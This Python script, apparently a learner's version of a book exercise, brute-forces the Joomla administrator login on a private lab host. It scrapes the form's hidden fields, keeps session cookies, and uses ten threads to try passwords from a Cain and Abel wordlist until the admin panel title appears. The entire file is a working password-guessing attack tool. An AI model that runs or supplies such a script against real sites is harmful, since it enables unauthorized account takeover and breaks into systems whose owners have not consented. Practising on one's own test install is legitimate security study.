from abc import ABC

import requests
import threading
import queue
from html.parser import HTMLParser

user_thread = 10
username = "whime"
wordlist_file = "./cain_wordlist.txt" # copy from Cain and Abel

target_url = "http://192.168.29.128/Joomla_3.9.27-Stable-Full_Package/administrator/index.php"
target_post = "http://192.168.29.128/Joomla_3.9.27-Stable-Full_Package/administrator/index.php"
username_field = "username"
password_field = "passwd"
# the administator page's title is kind of different from the book's,maybe because I use Joomla_3.9.27-Stable-Full_Package
# joomlatest is my test project name in host 192.168.29.128
success_check = "Control Panel - joomlatest - Administration"


class BruteParser(HTMLParser, ABC):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results={}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                # here the right value should be tag_value,not value as written in book,I think
                self.tag_results[tag_name] = tag_value


class Bruter:
    def __init__(self,username,words):
        self.username = username
        self.password_q = words
        self.found = False
        print("Finished setting up for :%s"%username)

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()

            # use session the keep the cookies of last request
            session = requests.session()
            response = session.get(target_url)
            session.cookies = response.cookies

            page = response.text
            print("Trying:%s:%s (%d left)"%(self.username,brute,self.password_q.qsize()))

            parser = BruteParser()
            parser.feed(page)
            post_data = parser.tag_results
            post_data[username_field]=self.username
            post_data[password_field]=brute

            # here!!! must use the session that keep the cookies from last get request,not requests module!!
            login_response = session.post(target_post,data=post_data)
            login_result = login_response.text

            if success_check in login_result:
                self.found = True
                print("Bruteforce successful")
                print("username:",username)
                print("password:",brute)
                print("waiting for other threads to exit..")


def build_wordlist(worldlist_file):
    with open(wordlist_file,"r") as f:
        raw_words = f.readlines()
    words = queue.Queue()

    for word in raw_words:
        word = word.rstrip()
        words.put(word)
    return words


if __name__ == '__main__':
    words = build_wordlist(wordlist_file)
    bruter = Bruter(username,words)
    bruter.run_bruteforce()